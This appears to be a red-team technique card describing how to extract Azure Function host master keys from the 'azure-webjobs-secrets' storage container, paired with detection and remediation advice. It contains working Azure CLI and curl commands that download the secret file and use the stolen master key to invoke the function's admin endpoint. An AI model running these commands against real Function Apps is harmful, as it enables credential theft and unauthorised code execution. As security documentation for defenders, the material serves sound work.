# [CA-TOKEN-003]: Azure Function Key Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-003 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure Functions |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Azure Functions use "Host Keys" (master/default) to authenticate HTTP triggers. These keys are stored in an Azure Storage Account (in the `azure-webjobs-secrets` container). If an attacker compromises the Storage Account keys (CA-UNSC-008), they can read the master key for the Function App, granting Admin access to the function.
- **Attack Surface:** Azure Storage Blob Containers.
- **Business Impact:** **Code Execution**. Full control over the Function App logic and any Managed Identities attached to it.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Storage Account Contributor.
- **Tools:**
    - Azure CLI
    - [MicroBurst](https://github.com/NetSPI/MicroBurst)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Get Storage Key**
(See CA-UNSC-008)

**Step 2: Read Function Secret**
```bash
az storage blob download --account-name stor1 --container-name azure-webjobs-secrets --name "myfunc/host.json" --file host.json
cat host.json
```
*Output: `{"masterKey": "..."}`*

**Step 3: Invoke Function**
```bash
curl -X POST https://myfunc.azurewebsites.net/admin/functions/exec?code=<MASTER_KEY>
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Activity Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Storage** | `GetBlob` | Access to `azure-webjobs-secrets` container from non-Azure IPs. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Identity:** Use **Entra ID Authentication** (EasyAuth) for Azure Functions instead of Host Keys.
*   **Network:** Secure the Storage Account with Private Endpoints.

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-UNSC-008]
> **Next Logical Step:** [LAT-CLOUD-001]
